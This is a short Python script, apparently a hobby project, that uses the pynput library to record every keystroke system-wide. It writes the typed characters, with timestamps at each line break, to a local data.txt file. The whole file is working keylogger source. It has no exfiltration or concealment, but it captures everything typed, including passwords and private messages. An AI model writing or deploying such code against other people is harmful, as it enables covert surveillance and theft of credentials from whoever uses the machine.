from pynput import keyboard
import os
from datetime import datetime


is_caps_lock=False
os.remove('./data.txt')

chars_dict = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '\n',
    keyboard.Key.tab: '\t'
}

def remove_quote(txt):
    return str(txt)[1:-1]

def display_keys(_key):
    global is_caps_lock

    f = open('./data.txt','a')
    to_write=''

    if _key == keyboard.Key.caps_lock:
        is_caps_lock = not is_caps_lock

    if _key in chars_dict.keys():
        to_write = str(chars_dict[_key])

    elif remove_quote(_key).isalpha():
        if is_caps_lock:
            _key = str(_key).upper()

        to_write = remove_quote(_key)

    elif len(remove_quote(_key))==1:
        to_write=remove_quote(_key)

    else:
        to_write='#'

    f.write(to_write)

    if _key == keyboard.Key.enter:
        f.write(datetime.now().strftime("%d/%m/%Y %H:%M:%S")+ "\n")

    # print(to_write,str(_key)[1:-1],str(_key)[1:-1].strip().isalpha())
    f.close()



with keyboard.Listener(on_press=display_keys) as l:
    l.join()